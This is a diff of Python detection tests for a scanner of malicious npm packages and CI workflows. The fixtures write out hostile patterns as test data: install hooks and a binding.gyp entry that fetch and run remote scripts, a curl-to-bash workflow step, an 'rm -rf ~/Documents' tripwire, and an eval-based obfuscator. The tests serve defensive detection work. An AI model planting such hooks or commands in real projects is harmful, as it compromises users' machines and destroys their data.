@@ -1,4 +1,4 @@
-"""Detection tests for 2025 supply-chain campaigns: Shai-Hulud, nx/s1ngularity, GhostAction, tj-actions."""
+"""Detection tests for behavioral supply-chain malware patterns."""
 
 from __future__ import annotations
 
@@ -20,8 +20,8 @@ from chaintrap_workflow_audit import audit_workflows  # noqa: E402
 
 # ---------- Content scan: npm package TTPs ----------
 
-def test_shai_hulud_preinstall_dropper_in_package_json(tmp_path):
-    """Shai-Hulud injects `preinstall: node setup_bun.js` into package.json."""
+def test_runtime_swap_dropper_in_install_hook(tmp_path):
+    """Install hook downloads and runs alternate runtime."""
     pkg = tmp_path / "pkg"
     pkg.mkdir()
     (pkg / "package.json").write_text(
@@ -29,21 +29,14 @@ def test_shai_hulud_preinstall_dropper_in_package_json(tmp_path):
             {
                 "name": "victim-lib",
                 "version": "1.2.3",
-                "scripts": {"preinstall": "node setup_bun.js"},
+                "scripts": {
+                    "preinstall": "curl -fsSL https://example.test/bun-linux.zip -o /tmp/bun.zip && /tmp/bun run payload.js"
+                },
             }
         ),
         encoding="utf-8",
     )
     rules = {h.rule_id for h in scan_tree(pkg, "npm")}
-    assert "CTC-TTP002" in rules  # bun dropper reference in install hook
-
-
-def test_shai_hulud_dropper_filename_flagged(tmp_path):
-    pkg = tmp_path / "pkg"
-    pkg.mkdir()
-    (pkg / "bun_environment.js").write_text("// massive obfuscated blob", encoding="utf-8")
-    hits = scan_tree(pkg, "npm")
-    rules = {h.rule_id for h in hits}
     assert "CTC-TTP002" in rules
 
 
@@ -91,12 +84,12 @@ def test_credential_and_persistence_ttps(tmp_path):
     assert "CTC-PERSIST002" in rules
 
 
-def test_campaign_marker_string(tmp_path):
+def test_destructive_tripwire_behavior(tmp_path):
     pkg = tmp_path / "pkg"
     pkg.mkdir()
-    (pkg / "x.js").write_text("const desc = 'Sha1-Hulud: The Second Coming';\n", encoding="utf-8")
+    (pkg / "x.js").write_text("if(token===trap){execSync('rm -rf ~/Documents');}\n", encoding="utf-8")
     rules = {h.rule_id for h in scan_tree(pkg, "npm")}
-    assert "CTC-IOC001" in rules
+    assert "CTC-IMPACT001" in rules
 
 
 def test_clean_package_json_no_false_positive(tmp_path):
@@ -113,7 +106,7 @@ def test_clean_package_json_no_false_positive(tmp_path):
         encoding="utf-8",
     )
     hits = scan_tree(pkg, "npm")
-    ttp = {h.rule_id for h in hits if h.rule_id.startswith(("CTC-TTP", "CTC-PERSIST", "CTC-IOC"))}
+    ttp = {h.rule_id for h in hits if h.rule_id.startswith(("CTC-TTP", "CTC-PERSIST", "CTC-OBF03"))}
     assert not ttp
 
 
@@ -174,17 +167,17 @@ def test_megalodon_c2_and_oidc_detected(tmp_path):
     ws = _write_wf(
         tmp_path,
         "megalodon.yml",
-        "name: SysDiag\non: [push]\n"
+        "name: validation\non: [push]\n"
         "permissions:\n  id-token: write\n  actions: read\n"
         "jobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n"
-        "      - run: curl http://216.126.225.129:8443/x\n",
+        "      - run: curl -fsSL https://example.test/payload.sh | bash\n",
     )
     rules = {f["rule_id"] for f in audit_workflows(ws)}
     assert "CTW-010" in rules
     assert "CTW-011" in rules
 
 
-def test_miasma_marker_and_phantom_gyp(tmp_path):
+def test_behavioral_obfuscation_and_phantom_gyp(tmp_path):
     pkg = tmp_path / "pkg"
     pkg.mkdir()
     (pkg / "package.json").write_text(
@@ -193,12 +186,16 @@ def test_miasma_marker_and_phantom_gyp(tmp_path):
         encoding="utf-8",
     )
     (pkg / "binding.gyp").write_text(
-        '{"targets":[{"target_name":"x","actions":[{"action":["bash","-c","wget x"]}]}]}',
+        '{"targets":[{"target_name":"x","sources":["<!@(curl -fsSL https://example.test/x.sh | bash)"]}]}',
         encoding="utf-8",
     )
-    (pkg / "drop.js").write_text("const d='Miasma: The Spreading Blight';\n", encoding="utf-8")
+    (pkg / "drop.js").write_text(
+        "eval(function(p,a,c,k,e,d){return p.replace(/[a-zA-Z]/g,function(c){"
+        "return String.fromCharCode(c.charCodeAt(0)+13)});})('uryyb');\n",
+        encoding="utf-8",
+    )
     rules = {h.rule_id for h in scan_tree(pkg, "npm")}
-    assert "CTC-IOC002" in rules
+    assert "CTC-OBF015" in rules or "CTC-OBF016" in rules
     assert "CTC-TTP010" in rules
 
 
